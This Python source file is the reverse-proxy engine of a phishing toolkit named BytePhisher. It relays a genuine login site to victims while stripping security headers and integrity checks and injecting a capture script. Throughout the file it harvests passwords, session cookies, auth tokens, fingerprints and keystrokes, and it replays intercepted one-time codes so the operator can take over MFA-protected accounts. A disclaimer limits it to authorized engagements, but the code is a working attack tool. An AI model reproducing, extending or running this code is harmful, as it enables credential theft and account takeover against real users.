# BytePhisher - reverse-proxy engine (Layer 1).
#
# Instead of serving a static copy of a login page, this proxies the REAL site
# live and injects a capture hook, so the victim sees the genuine page (real CSS,
# real JS, real redirects, real MFA prompts) while every submission, cookie and
# fingerprint lands in the capture store.
#
# How it works
#   * a "phishlet" (YAML) describes the target: upstream host, which paths get the
#     hook, which fields are credentials, which cookies matter
#   * each victim gets a ProxySession with its own upstream cookie jar, so
#     multi-step flows (login -> MFA -> dashboard) keep working against the real
#     site
#   * responses are rewritten: absolute URLs point back at the proxy, SRI
#     integrity attributes and CSP/HSTS/X-Frame headers are dropped, Set-Cookie
#     Domain attributes are neutralised, Location headers are rewritten
#   * the injected hook intercepts fetch/XHR/form.submit, ships the fields plus a
#     device fingerprint to /__bh/capture, then lets the real submit proceed so
#     the upstream session is genuinely established (MFA relay, not bypass)
#
# Authorized engagements only: proxying a third-party site without written
# permission is illegal in most jurisdictions.
import contextlib
import email.utils
import html as html_mod
import http.cookiejar
import http.server
import json
import os
import re
import secrets
import socketserver
import threading
import time
import urllib.parse

from . import asset_path as _asset_path
from . import classify, tls_fp, transport
from . import intel as intel_mod
from . import lures as lures_mod
from . import session as session_mod
from . import symbols as _symbols_mod
from .challenge import VERIFY_PATH
from .intel import INTEL_JS_PATH, INTEL_PATH

# Phishlet v2 lives in core/phishlet.py; re-exported because the proxy's
# public API has always exposed it here (tests and callers import it).
from .phishlet import Phishlet  # noqa: F401

try:
    import yaml
except ImportError:                                     # pragma: no cover
    yaml = None

DEFAULT_UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
              "(KHTML, like Gecko) Chrome/124.0 Safari/537.36")

# headers that must not survive the hop (they break proxying or leak the trick)
# Headers that can hand the upstream origin back to the victim. `Link` and
# `Content-Location` were forwarded verbatim, so a rewritten page still
# advertised https://login.example.com/... in its own headers.
REWRITE_RESPONSE_HEADERS = ("link", "content-location", "refresh",
                            "access-control-allow-origin", "report-to", "nel")

STRIP_RESPONSE_HEADERS = {
    "content-security-policy", "content-security-policy-report-only",
    "strict-transport-security", "x-frame-options", "public-key-pins",
    "public-key-pins-report-only", "expect-ct", "report-to", "nel",
    "cross-origin-opener-policy", "cross-origin-embedder-policy",
    "content-length", "content-encoding", "transfer-encoding", "connection",
    "alt-svc", "clear-site-data",
}
# Only what the transport must own. `Sec-Fetch-*` and `Upgrade-Insecure-Requests`
# are NOT stripped any more: a real Chrome always sends them, and their absence is a
# "not a browser" signal. `accept-encoding` stays ours because the transport can only
# decode what it advertises (brotli is optional - see core/transport.py).
STRIP_REQUEST_HEADERS = {
    "host", "content-length", "accept-encoding", "connection", "expect",
}


HOOK_PATH = "/__bh/hook.js"
CAPTURE_PATH = "/__bh/capture"
BEACON_PATH = "/__bh/beacon"

# Hard limits so a hostile or broken client cannot exhaust memory. A real
# browser submission is a few KB; 2 MB is generous for a login form plus the
# fingerprint/telemetry payload.
MAX_BODY = 2 * 1024 * 1024
MAX_INTEL_SCORES = 2000        # one entry per sid; a client can invent sids
# The session map holds one small object per victim. Cap it and evict the
# least-recently-seen entries, otherwise a long campaign grows forever.
MAX_SESSIONS = 5000
# The typing/mouse telemetry the hook ships is kept in memory for the session's own
# report; this bounds the durable copy that rides in the vault record so a long visit
# cannot grow the stored record without limit.
RECORDING_PERSIST = 500
# short alias so a page can also post to /intel
INTEL_ALIAS_FALLBACK = "/intel"


# ------------------------------------------------------------------ phishlet --
# Phishlet v2 lives in core/phishlet.py (multi-host, sub_filters, js_inject,
# auth_tokens/auth_urls, credentials, force_post, template params). Re-exported
# here so `from core.proxy import Phishlet` keeps working.

class ProxySession:
    """One victim: its own upstream cookie jar + everything we learned."""

    def __init__(self, sid, ip="", ua=DEFAULT_UA, campaign="", phishlet=None,
                 lure="", ja3=None, geo=None):
        self.sid = sid
        self.ip = ip
        self.ua = ua or DEFAULT_UA
        self.campaign = campaign
        self.created = time.time()
        self.cookies = http.cookiejar.CookieJar()      # upstream session state
        self.harvested = []                            # cookies we care about
        self.captures = 0
        # ---- v2: everything the operator needs in one place ----
        self.lure = lure
        self.ja3 = dict(ja3 or {})
        self.tokens = {}                       # auth_tokens captured (cookies/headers)
        self.session_complete = False
        self.device_token = ""
        self.pending_login = None   # last credential POST, so a streamed OTP can finish it
        self.vault = session_mod.new_record(
            sid, phishlet=(phishlet.name if phishlet else ""), campaign=campaign,
            ip=ip, ua=ua, ja3=self.ja3, geo=geo or {}, lure=lure)
        self.fingerprint = {}
        self.recording = []                            # rrweb-style events
        self.last_seen = time.time()

    def cookie_header(self):
        return "; ".join(f"{c.name}={c.value}" for c in self.cookies)

    def note_cookies(self, phishlet, set_cookie_headers, host=""):
        """Parse upstream Set-Cookie values into the jar and record the juicy ones.

        Attributes are preserved and the domain falls back to the host that set
        the cookie, because a cookie with no domain is a cookie no browser will
        ever send back (that bug made every captured session unusable).
        """
        for raw in set_cookie_headers:
            c = session_mod.parse_set_cookie(raw, host)
            if not c:
                continue
            domain = c["domain"] or (host or "")
            cookie = http.cookiejar.Cookie(
                version=0, name=c["name"], value=c["value"],
                port=None, port_specified=False,
                domain=domain, domain_specified=bool(c["domain"]),
                domain_initial_dot=str(domain).startswith("."),
                path=c.get("path") or "/", path_specified=True,
                secure=bool(c["secure"]), expires=c.get("expirationDate"),
                discard=bool(c.get("session", True)),
                comment=None, comment_url=None,
                rest={"HttpOnly": "1" if c.get("httpOnly") else "0",
                      "SameSite": c.get("sameSite") or "unspecified"},
                rfc2109=False)
            self.cookies.set_cookie(cookie)
            if phishlet.wants_cookie(c["name"]):
                self.harvested.append({"name": c["name"], "value": c["value"],
                                       "ts": time.time(), "domain": domain})

    def to_dict(self):
        return {"sid": self.sid, "ip": self.ip, "ua": self.ua, "campaign": self.campaign,
                "created": self.created, "captures": self.captures,
                "harvested_cookies": self.harvested, "fingerprint": self.fingerprint,
                "events": len(self.recording)}


# -------------------------------------------------------------------- engine --
class ProxyEngine:
    """Fetch upstream, rewrite, inject, capture."""

    def __init__(self, phishlet, db=None, on_capture=None, geo_provider="off",
                 trust_headers=True, impersonate="", server_header="nginx",
                 public_host="", logger=print, rewrite_absolute=True, gate=None):
        self.phishlet = phishlet
        self.gate = gate
        self.intel_scores = {}
        self._geo_cache = {}          # ip -> (ts, geo), for gate decisions      # sid -> headless/automation score (0-100)
        self.db = db
        self.on_capture = on_capture
        self.geo_provider = geo_provider
        self.trust_headers = bool(trust_headers)
        # the upstream leg's TLS fingerprint: "chrome" makes our ClientHello
        # identical to the browser the victim is using
        self.impersonate = str(impersonate or "")
        # the Server header for responses the upstream did not label itself
        self.server_header = str(server_header or "").strip()
        self.public_host = public_host          # what victims see (proxy domain)
        self.log = logger
        self.sessions = {}
        self.rewrite_absolute = rewrite_absolute
        self._lock = threading.Lock()

    # ------------------------------------------------- hook path relocation --
    # The collector lives under one base path. A fixed "/__bh" is a signature a
    # rule can match on, so the operator can move it per campaign with
    # --hook-path; every collector route is derived from this one value.
    hook_base = "/__bh"

    def path_of(self, default_path):
        """Map a default collector route onto this engine's base path."""
        base = getattr(self, "hook_base", "/__bh") or "/__bh"
        if base == "/__bh":
            return default_path
        return default_path.replace("/__bh", base.rstrip("/"), 1)

    def geo_cached(self, ip, ttl=300):
        """Geo/ISP with a short cache.

        The gate needs geo on every request and the providers are remote, so an
        uncached lookup per request would add a network round trip to each one.
        """
        if not ip:
            return {}
        now = time.time()
        hit = self._geo_cache.get(ip)
        if hit and now - hit[0] < ttl:
            return hit[1]
        g = self.geo(ip)
        if len(self._geo_cache) > 512:
            # drop the oldest half in one pass rather than evicting one by one
            for k in sorted(self._geo_cache, key=lambda k2: self._geo_cache[k2][0])[:256]:
                self._geo_cache.pop(k, None)
        self._geo_cache[ip] = (now, g)
        return g

    def geo(self, ip):
        """Geo/ISP for an IP, using the same providers as the static server."""
        if self.geo_provider == "off" or not ip:
            return {}
        urls = {"ipapi": "https://ipapi.co/{ip}/json/",
                "ipinfo": "https://ipinfo.io/{ip}/json"}
        tmpl = urls.get(self.geo_provider)
        if not tmpl:
            return {}
        try:
            from . import net
            g = net.fetch_json(tmpl.format(ip=ip), timeout=5)
            _name = g.get("country_name") or g.get("country") or ""
            _code = g.get("country_code") or ""
            if not _code and len(str(g.get("country") or "")) == 2:
                _code = str(g["country"])
            return {"ip": ip, "city": g.get("city") or "",
                    "country": _name, "country_code": str(_code).upper(),
                    "isp": (g.get("org") or g.get("asn") or g.get("isp") or "")}
        except Exception:
            return {}

    # ---- sessions ----
    def session(self, sid=None, ip="", ua="", campaign="", ja3=None):
        with self._lock:
            if sid and sid in self.sessions:
                s = self.sessions[sid]
                s.last_seen = time.time()
                return s
            # secrets, not uuid4: a session id must not be predictable, and
            # 128 bits makes guessing useless (uuid4 hex[:16] was 64 bits)
            sid = sid or secrets.token_hex(16)
            s = ProxySession(sid, ip=ip, ua=ua, campaign=campaign,
                             phishlet=self.phishlet, ja3=ja3, geo=self.geo(ip))
            # deliberately NOT saved here: measured, a cookie-less page view minted a
            # session and this line wrote a durable row for it, so any scanner burst
            # bloated the store (300 requests -> 300 rows). The record is written by the
            # paths that actually capture something (credentials, cookies, tokens,
            # intel, a scanner verdict, a challenge outcome).
            self.sessions[sid] = s
            if len(self.sessions) > MAX_SESSIONS:
                # evict the least-recently-seen quarter in one pass
                drop = sorted(self.sessions.values(), key=lambda x: x.last_seen)
                for old in drop[: max(1, MAX_SESSIONS // 4)]:
                    self.sessions.pop(old.sid, None)
            return s

    # ---- upstream ----
    def host_for(self, headers, sess=None):
        """Which upstream host does this request belong to (multi-host chains)?"""
        host = ""
        for k, v in (headers or {}).items():
            if str(k).lower() == "host":
                host = str(v)
                break
        return self.phishlet.host_for(host)

    def fetch(self, sess, method, path, headers=None, body=None, host=None):
        """Request the real site with this victim's cookie jar.

        An absolute URL is only accepted when it points at OUR upstream. A
        victim-supplied absolute-form request line (GET http://internal/...) used
        to be fetched verbatim, which turned the proxy into an open forward
        proxy: internal services, loopback and cloud metadata were reachable,
        and the victim's session cookies were sent to the chosen host.
        """
        if path.startswith("http"):
            # Compare the parsed HOST, not a string prefix: a prefix test also
            # accepts "https://login.example.com.attacker.test/x" and the
            # userinfo form "https://login.example.com@attacker.test/x", both of
            # which requests would connect to attacker.test.
            parsed = urllib.parse.urlsplit(path)
            allowed = {h.orig_host.lower() for h in self.phishlet.proxy_hosts}
            if parsed.scheme not in ("http", "https") or \
                    (parsed.hostname or "").lower() not in allowed:
                raise ValueError("refusing to fetch a foreign absolute URL")
            url = path
        else:
            base = (host.base_url if host else self.phishlet.base_url)
            url = f"{base}{path}"
        h = {k: v for k, v in (headers or {}).items()
             if k.lower() not in STRIP_REQUEST_HEADERS}
        h.setdefault("User-Agent", sess.ua)
        h.setdefault("Accept-Language", "en-US,en;q=0.9")
        # A plain {name: value} dict bypasses CookieJar matching, so a cookie
        # scoped to api.example.com with Path=/admin was sent to every sibling
        # host and over plain HTTP. A Session carrying the jar honours
        # domain/path/secure.
        resp = transport.request(
            method, url, headers=h, body=body, jar=sess.cookies,
            timeout=self.phishlet.timeout, verify=self.phishlet.verify_tls,
            impersonate=self.impersonate)
        sess.note_cookies(self.phishlet, transport.set_cookies(resp),
                          host=(host.orig_host if host is not None
                                else self.phishlet.upstream))
        return resp


    # ---- rewriting ----
    def rewrite_headers(self, resp, over_tls=False):
        """Return a LIST of (name, value) pairs.

        Duplicates matter: an upstream page can set several cookies and we must
        add our own session cookie on top, so a dict would silently drop them.
        """
        out = []
        for k, v in (resp.pairs if getattr(resp, "pairs", None)
                     else resp.headers.items()):
            kl = k.lower()
            if kl in STRIP_RESPONSE_HEADERS:
                continue
            if kl == "set-cookie":
                # keep the cookie usable on our host: Domain always goes, and
                # Secure only when we are serving plain HTTP (keeping it over
                # HTTPS preserves the upstream's transport guarantee)
                v = re.sub(r";\s*Domain=[^;]+", "", v, flags=re.I)
                # `__Host-`/`__Secure-` cookies and SameSite=None REQUIRE Secure: a
                # browser discards them without it, so the session never sticks.
                # Stripping it is only safe for an ordinary cookie over plain HTTP.
                name = v.split("=", 1)[0].strip().lower()
                needs_secure = (name.startswith("__host-") or name.startswith("__secure-")
                                or "samesite=none" in v.lower())
                if not over_tls and not needs_secure:
                    v = re.sub(r";\s*Secure", "", v, flags=re.I)
                out.append((k, v))
                continue
            if kl == "location":
                out.append((k, self.rewrite_url(v)))
                continue
            if kl == "access-control-allow-origin":
                # `*` and opaque values are not URLs: running them through the URL
                # rewriter turned an unmappable origin into "/" and broke
                # credentialed cross-host XHR in SPA flows
                out.append((k, v))
                continue
            if kl in REWRITE_RESPONSE_HEADERS:
                # rewrite any upstream origin these headers mention, or drop the
                # header when it is not a URL we can rewrite
                rewritten = self.rewrite_url(v)
                if rewritten == v and kl in ("report-to", "nel"):
                    continue
                out.append((k, rewritten))
                continue
                continue
            out.append((k, v))
        # exactly one Server and one Date: the upstream's when it labelled itself,
        # ours only as a fallback (a blank value counts as not labelled, and the
        # empty header is dropped rather than left next to ours)
        out = [(k, v) for k, v in out
               if not (k.lower() in ("server", "date") and not str(v).strip())]
        names = {k.lower() for k, v in out if str(v).strip()}
        if "server" not in names and self.server_header:
            out.append(("Server", self.server_header))
        if "date" not in names:
            # the handler owns date_time_string; the engine must not call it
            out.append(("Date", email.utils.formatdate(usegmt=True)))
        return out

    def rewrite_url(self, url):
        """Point an upstream absolute URL back at the proxy."""
        if not url or not self.rewrite_absolute:
            return url
        for host in self.phishlet.rewrite_hosts:
            if not host:
                continue
            url = re.sub(rf"https?://{re.escape(host)}", "", url, count=1)
        if url.startswith("//"):
            url = "/" + url[2:]
        return url or "/"

    def rewrite_target(self, host):
        """The host that rewrites should point at, or "" when none is known.

        A rewrite must never aim the victim's browser at the vendor's own domain,
        so an unset public host with no configured phish subdomain means "do not
        rewrite" rather than "rewrite to something plausible".
        """
        if self.public_host:
            return self.public_host
        if host is not None and host.phish_sub and host.phish_host != host.orig_host:
            # a phishlet that mirrors the subdomain verbatim (phish_sub ==
            # orig_sub) would rewrite origins to the REAL host, which is worse
            # than leaving them alone
            return host.phish_host
        return ""

    def apply_sub_filters(self, text, host, content_type, path="/"):
        """MIME-targeted rewrite filters (the phishlet's own rules)."""
        target = self.rewrite_target(host)
        filters = self.phishlet.filters_for(host.orig_host if host else "", content_type)
        if not filters:
            return text
        if not target:
            if not getattr(self, "_warned_no_host", False):
                self._warned_no_host = True
                self.log("[proxy] no public host set: origin rewrites are disabled "
                         "(set --url or bring a tunnel up, or give the phishlet a "
                         "phish_sub) - serving the upstream markup as-is")
            return text
        ctx = {"basedomain": target, "hostname": target, "domain": target,
               "orig_domain": host.orig_host if host else "",
               "phish_host": host.phish_host if host else ""}
        for f in filters:
            text = f.apply(text, ctx)
        return text

    def inject_js(self, html, host, path, content_type, sess=None):
        """phishlet js_inject payloads (triggered by domain + path)."""
        payloads = self.phishlet.js_for(host.orig_host if host else "", path, content_type)
        if not payloads:
            return html
        blocks = []
        for js in payloads:
            if sess is not None:
                js = js.replace("__SID__", sess.sid)
            blocks.append(f"<script>{js}</script>")
        tag = "".join(blocks)
        if re.search(r"</head>", html, re.I):
            return re.sub(r"</head>", tag + "</head>", html, count=1, flags=re.I)
        if re.search(r"</body>", html, re.I):
            return re.sub(r"</body>", tag + "</body>", html, count=1, flags=re.I)
        return tag + html

    def rewrite_html(self, html, sess, path="/", host=None, content_type="text/html",
                     decoy_mode=False):
        # 0) phishlet v2 filters first: they know the exact strings to fix
        html = self.apply_sub_filters(html, host, content_type, path)
        # 0b) the matched target's own address, already in the form. Never in a decoy: a
        # scanner must not be handed a real recipient's address.
        if not decoy_mode and getattr(self, "targets", None):
            from core import targets as _targets_mod
            hit = self.target_for(path, path,
                                  cookie_email=(getattr(sess, "email", "") or ""))
            if hit is not None:
                html = _targets_mod.prefill_html(html, hit)
                with contextlib.suppress(Exception):
                    sess.vault.setdefault("meta", {})["target"] = hit.to_dict()
        # 1) absolute links/actions back to the proxy
        for host in self.phishlet.rewrite_hosts:
            if not host:
                continue
            html = re.sub(rf'((?:href|src|action)=["\'])(?:https?:)?//{re.escape(host)}',
                          r"\1", html, flags=re.I)
        # 2a) a policy can also arrive as a meta tag, which the header handling
        # never saw - and it would refuse the collector script
        html = re.sub(r"<meta[^>]+http-equiv\s*=\s*[\"']?(x-)?content-security-policy"
                      r"[^>]*>", "", html, flags=re.I)
        # 2) SRI breaks once we inject/rewrite, so drop integrity attributes
        if self.phishlet.strip_integrity:
            html = re.sub(r'\s+integrity=["\'][^"\']*["\']', "", html, flags=re.I)
            html = re.sub(r'\s+crossorigin=["\'][^"\']*["\']', "", html, flags=re.I)
        # 3) inject the hook + the deep-intel collector - never into a decoy.
        # A decoy is served to a scanner: handing it the hook and the collector
        # tags (and with them the session id and the endpoints) defeats the point
        # of the decoy entirely.
        if not decoy_mode and self.phishlet.wants_injection(path):
            # no `?s=<sid>`: the collector is attributed from the HttpOnly session
            # cookie, so the page never learns the handle that identifies the victim
            sym = self.symbols
            tag = (f'<script src="{self.path_of(HOOK_PATH)}" '
                   f'{sym.capture_attr}="{self.path_of(CAPTURE_PATH)}" '
                   f'{sym.beacon_attr}="{self.path_of(BEACON_PATH)}"></script>')
            tag += (f'<script src="{self.path_of(INTEL_JS_PATH)}'
                    f'?p={1 if self.phishlet.intel_perms else 0}" '
                    f'{sym.intel_attr}="{self.path_of(INTEL_PATH)}" defer></script>')
            if re.search(r"</head>", html, re.I):
                html = re.sub(r"</head>", tag + "</head>", html, count=1, flags=re.I)
            elif re.search(r"</body>", html, re.I):
                html = re.sub(r"</body>", tag + "</body>", html, count=1, flags=re.I)
            else:
                html = tag + html
        return html

    # ---- deep device intelligence ----
    def intel(self, payload, ip=""):
        """Merge one collector wave and (re)write the session's intel record."""
        sid = str(payload.get("sid") or "").strip() or secrets.token_hex(8)
        merged = intel_mod.merge_waves(self.db.intel_for_session(sid) if self.db else {},
                                       payload)
        geo = self.geo(ip) if self.geo_provider != "off" else {}
        summary = intel_mod.summarize(merged, ua=payload.get("ua") or "",
                                      server_ip=ip,
                                      geo_country=(geo or {}).get("country", ""))
        summary["sid"] = sid
        with contextlib.suppress(Exception):
            self.intel_scores[sid] = int((summary.get("automation") or {})
                                         .get("headless_score") or 0)
            if len(self.intel_scores) > MAX_INTEL_SCORES:
                # one entry per attacker-chosen sid: keep the newest half
                for k in list(self.intel_scores)[:MAX_INTEL_SCORES // 2]:
                    self.intel_scores.pop(k, None)
        risk = intel_mod.risk_from_intel(summary)
        if self.db:
            raw = {"mods": merged, "last": payload}
            if self.db.intel_for_session(sid):
                self.db.intel_update(sid, summary, raw, risk=risk)
            else:
                self.db.log_intel(sid, ip, (geo or {}).get("city", ""),
                                  (geo or {}).get("country", ""), (geo or {}).get("isp", ""),
                                  summary.get("user_agent") or payload.get("ua") or "",
                                  summary, raw, risk=risk)
        # a real device that arrives with no form submit still pings the operator
        if self.on_capture and payload.get("wave") in ("open", "gesture", "final"):
            with contextlib.suppress(Exception):
                self.on_capture({
                    "type": "intel", "sid": sid, "ip": ip,
                    "browser": summary.get("browser"), "os": summary.get("os"),
                    "device_class": summary.get("device_class"),
                    "device_token": (summary.get("fingerprint") or {}).get("device_token"),
                    "headless": (summary.get("automation") or {}).get("headless_score"),
                    "vpn": (summary.get("network_risk") or {}).get("vpn_suspected_score"),
                    "wave": payload.get("wave"),
                })
        return {"ok": True, "sid": sid, "wave": payload.get("wave"),
                "modules": len(summary.get("modules_collected") or []),
                "headless": (summary.get("automation") or {}).get("headless_score"),
                "device_token": (summary.get("fingerprint") or {}).get("device_token")}

    # ---- v2 session accounting ----
    @staticmethod
    def jar_to_dicts(jar):
        """Cookie jar -> vault/export dicts, attributes included."""
        out = []
        try:
            for c in jar:
                rest = getattr(c, "_rest", None) or {}
                http_only = str(rest.get("HttpOnly", "0")).lower() in ("1", "true", "yes")
                same = rest.get("SameSite") or "unspecified"
                out.append({"name": c.name, "value": c.value,
                            "domain": c.domain or "", "path": c.path or "/",
                            "secure": bool(c.secure), "httpOnly": http_only,
                            "sameSite": same,
                            "expirationDate": (c.expires if c.expires else None),
                            "session": not bool(c.expires),
                            "hostOnly": not bool(c.domain_specified)})
        except Exception:
            pass
        return out

    def _auth_url_hit(self, path):
        """Did this path match one of the phishlet's post-login URLs?"""
        if not path or not self.phishlet.auth_urls:
            return False
        p = path.split("?")[0]
        for u in self.phishlet.auth_urls:
            try:
                if re.search(u, p):
                    return True
            except re.error:
                if u in p:
                    return True
        return False

    def note_credentials(self, sess, got, path="", host=None, body=None, headers=None):
        """Credentials seen in a PROXIED request body (no JS needed).

        This is the Evilginx-side half of credential capture: the JS hook is the
        fast path, but a native form post, a no-JS client or a blocked script
        must not mean a lost credential.
        """
        if not got:
            return 0
        n = session_mod.add_credentials(sess.vault, got)
        if not n:
            return 0
        # remember the request so a streamed one-time code can finish this login
        # upstream the moment the victim types it
        if body is not None:
            sess.pending_login = {"path": path or "/", "body": body, "host": host,
                                  "headers": dict(headers or {}), "ts": time.time()}
        session_mod.touch(sess.vault, "creds", ",".join(sorted(got.keys())),
                          state="creds")
        if self.db is not None:
            try:
                self.db.session_save(sess.vault)
            except Exception as e:
                self.log(f"[proxy] vault save failed: {type(e).__name__}: {e}")
        if self.on_capture:
            with contextlib.suppress(Exception):
                self.on_capture({
                    "type": "creds", "sid": sess.sid, "ip": sess.ip,
                    "campaign": sess.vault.get("campaign", ""),
                    "lure": sess.lure, "phishlet": self.phishlet.name,
                    "state": "creds", "credentials": dict(got),
                    "fields": dict(got), "path": path,
                    "ua": sess.ua, "device": self._device(sess.ua),
                    "proxy_mode": True, "source": "proxy",
                })
        return n

    def note_live(self, sess, payload, ip=""):
        """Handle one real-time input beacon: store it, alert, and act on an OTP."""
        events, kind = intel_mod.normalise_live(payload)
        if not events:
            return {"ok": True, "stored": 0}
        if self.db:
            with contextlib.suppress(Exception):
                self.db.live_add(sess.sid, kind, events, ts=payload.get("ts"))
        else:
            store = sess.vault.setdefault("live_input", [])
            store.extend(events)
            if len(store) > 800:                 # bound the vault, keep the tail
                del store[:-800]
        session_mod.touch(sess.vault, "live", f"{len(events)} event(s) [{kind}]")
        if self.db:
            with contextlib.suppress(Exception):
                self.db.session_save(sess.vault)
        otps = [e for e in events if e.get("k") == "input"
                and intel_mod.looks_like_otp(e.get("n"), e.get("v"))]
        result = {"ok": True, "stored": len(events), "otp": bool(otps)}
        if self.on_capture:
            with contextlib.suppress(Exception):
                self.on_capture({
                    "type": "otp" if otps else "live",
                    "sid": sess.sid, "ip": ip or sess.ip, "campaign": sess.vault.get("campaign", ""),
                    "lure": sess.lure, "phishlet": self.phishlet.name,
                    "events": events[-12:], "kind": kind,
                    "credentials": dict(sess.vault.get("credentials") or {}),
                    "otp": [{"field": e.get("n"), "value": e.get("v")} for e in otps],
                    "state": sess.vault.get("state"),
                })
        if otps:
            result["auto"] = self.complete_with_otp(sess, otps[-1])
        return result

    def complete_with_otp(self, sess, otp_event):
        """Finish the pending login upstream using a streamed one-time code.

        This is the MFA relay in its useful form: the code the victim typed is
        replayed against the real site inside the same session, so the session
        is captured at the moment the site accepts it.
        """
        pend = getattr(sess, "pending_login", None)
        if not pend:
            return {"ok": False, "reason": "no pending login to complete"}
        body = pend.get("body")
        if isinstance(body, (bytes, bytearray)):
            text = body.decode("utf-8", "replace")
        else:
            text = str(body or "")
        # the field name goes into a form body: a crafted name ("otp&csrf=X")
        # used to append arbitrary extra fields to the replayed login
        field = re.sub(r"[^A-Za-z0-9_.\-\[\]]", "", str(otp_event.get("n") or ""))[:60]
        value = str(otp_event.get("v") or "")
        if not value:
            return {"ok": False, "reason": "empty code"}
        if field and re.search(rf"(^|&){re.escape(field)}=", text):
            text = re.sub(rf"(^|&){re.escape(field)}=[^&]*",
                          lambda m: f"{m.group(1)}{field}={urllib.parse.quote(value)}", text)
        else:
            text = (text + "&" if text else "") + f"{field or 'code'}={urllib.parse.quote(value)}"
        headers = dict(pend.get("headers") or {})
        headers["Content-Type"] = "application/x-www-form-urlencoded"
        headers["Content-Length"] = str(len(text.encode()))
        try:
            resp = self.fetch(sess, "POST", pend.get("path") or "/", headers=headers,
                              body=text.encode(), host=pend.get("host"))
        except Exception as e:
            return {"ok": False, "reason": f"{type(e).__name__}: {e}"}
        self.note_tokens(sess, resp, pend.get("path") or "/", host=pend.get("host"))
        captured = self.maybe_complete(sess, pend.get("path") or "/", host=pend.get("host"))
        return {"ok": True, "status": resp.status_code, "captured": bool(captured),
                "cookies": len(self.jar_to_dicts(sess.cookies))}

    def note_tokens(self, sess, resp, path="", host=None):
        """Collect the tokens this phishlet cares about, from cookies and headers."""
        names = []
        try:
            for h in transport.set_cookies(resp):
                names.append(h.split("=")[0].strip())
        except Exception:
            pass
        with contextlib.suppress(Exception):
            names.extend(list(resp.headers.keys()))
        with contextlib.suppress(Exception):
            names.extend([c.name for c in sess.cookies])
        # an auth_token is scoped to the host that sets it: match against the
        # host this response came from, not blindly against the landing host
        where = host.orig_host if host is not None else self.phishlet.upstream
        for n in names:
            if not n:
                continue
            wanted, _opt = self.phishlet.token_wanted(n, where)
            if not wanted and not where:
                # only when the response host is genuinely unknown does the
                # unscoped check apply; using it unconditionally made the
                # domain scoping in the phishlet dead code
                wanted, _opt = self.phishlet.token_wanted(n, "")
            if wanted:
                sess.tokens[n] = True
        # merge, never replace: an OAuth/device-code token set (real access/refresh
        # values, mirrored into rec["tokens"] by session.add_oauth) lives here too, and a
        # later cookie/header harvest used to overwrite it with a bare {name: True} dict,
        # wiping the refresh token the token tier and the CLI read.
        bucket = sess.vault.setdefault("tokens", {})
        if not isinstance(bucket, dict):
            bucket = {}
            sess.vault["tokens"] = bucket
        bucket.update(sess.tokens)

    def maybe_complete(self, sess, path="", host=None):
        """Flip the session to 'captured' the moment the phishlet's tokens are in.

        This is the difference between "we saw a login" and "we own the session":
        the operator gets an alert carrying the cookie jar, and the victim is
        released to the real site (or the phishlet's redirect target).
        """
        if sess.session_complete:
            return False
        names = list(sess.tokens.keys()) + [c.name for c in sess.cookies]
        if not self.phishlet.session_complete(names, path):
            return False
        # A site can set a cookie whose name matches an auth token on the very
        # first page. Without a credential submit or an auth_url hit that is an
        # anonymous jar, not a captured session, and reporting it as captured
        # sends the operator a false "we own the session" alert.
        if not (sess.vault.get("credentials") or self._auth_url_hit(path)):
            return False
        sess.session_complete = True
        cookies = self.jar_to_dicts(sess.cookies)
        session_mod.add_cookies(sess.vault, cookies)
        session_mod.touch(sess.vault, "session", f"{len(cookies)} cookie(s) captured",
                          state="session")
        if self.db:
            try:
                self.db.session_save(sess.vault)
                if sess.lure and not str(sess.lure).startswith("burned:"):
                    lure = self.db.lure_get(sess.lure)
                    if lure:
                        self.db.lure_convert(lure)
            except Exception as e:
                self.log(f"[proxy] session save failed: {type(e).__name__}: {e}")
        if self.on_capture:
            with contextlib.suppress(Exception):
                self.on_capture({
                    "type": "session", "sid": sess.sid, "ip": sess.ip,
                    "campaign": sess.vault.get("campaign", ""),
                    "lure": sess.lure, "phishlet": self.phishlet.name,
                    "state": "session", "cookies": cookies,
                    "credentials": dict(sess.vault.get("credentials") or {}),
                    "tokens": sorted(sess.tokens.keys()),
                    "token_intel": sess.vault.get("token_intel") or {},
                    "device_token": sess.device_token,
                    "ja3": sess.ja3, "ua": sess.ua,
                    "takeover_hint": f"bytephisher --session {sess.sid}",
                })
        return True

    # ---- capture ----
    def capture(self, sess, payload, ip=""):
        """Store one hook submission (fields + cookies + fingerprint)."""
        fields = payload.get("fields") or {}
        cookies = payload.get("cookies") or {}
        fp = payload.get("fingerprint") or {}
        events = payload.get("events") or []
        # lure token may arrive with the hook payload (fragment lures)
        lure_tok = str(payload.get("lure") or "").strip()
        if lure_tok and not sess.lure and self.db:
            lure = self.db.lure_get(lure_tok)
            if lure and self.db.lure_use(lure, ip):
                sess.lure = lure.token
                sess.vault["lure"] = lure.token
                session_mod.touch(sess.vault, "lure", f"fragment:{lure.token}")
        if fp:
            sess.device_token = str(fp.get("canvas_hash") or "")[:32] or sess.device_token
            sess.vault["device_token"] = sess.device_token
        body_text = "&".join(f"{k}={v}" for k, v in fields.items() if v not in (None, ""))
        creds = {}
        for name, cf in (self.phishlet.credentials or {}).items():
            val = cf.extract(body_text)
            if val:
                creds[name] = val
        if not creds:
            # share the classifier the rest of the tool uses: a substring test
            # matched "pin" inside "shipping" and "code" inside "zipcode"
            for k in classify.credential_keys(fields):
                if fields.get(k) not in (None, ""):
                    creds[k] = fields[k]
        if creds:
            session_mod.add_credentials(sess.vault, creds)
            session_mod.touch(sess.vault, "creds", ",".join(creds.keys()), state="creds")
        sess.captures += 1
        sess.fingerprint.update(fp)
        if events:
            # total cap, not just a per-call slice: a client posting 500 events
            # in a loop used to grow one session's recording without limit
            sess.recording.extend(events[:500])
            if len(sess.recording) > 5000:
                del sess.recording[:-5000]
            # DEFECT: the recording was collected and capped but only len() was ever
            # consumed - the telemetry never left the process and was lost on restart.
            # Persist a bounded tail into the vault so it survives (and rides along in
            # the stored record).
            sess.vault["recording"] = sess.recording[-RECORDING_PERSIST:]
        for name, value in (cookies or {}).items():
            if not self.phishlet.wants_cookie(name):
                continue
            # dedupe by name and cap: a client posting captures in a loop grew
            # one session's memory indefinitely (recording was capped, this was
            # not)
            sess.harvested = [h for h in sess.harvested if h.get("name") != name]
            sess.harvested.append({"name": name, "value": value,
                                   "ts": time.time(), "source": "js"})
            if len(sess.harvested) > 200:
                del sess.harvested[:-200]
        is_cred = classify.is_credential_pair(fields)
        risk, reasons = self._risk(fields, fp)
        if self.db is not None:
            try:
                # the vault is the durable half of a capture: without this the
                # creds lived only in memory and the DB record stayed "opened"
                self.db.session_save(sess.vault)
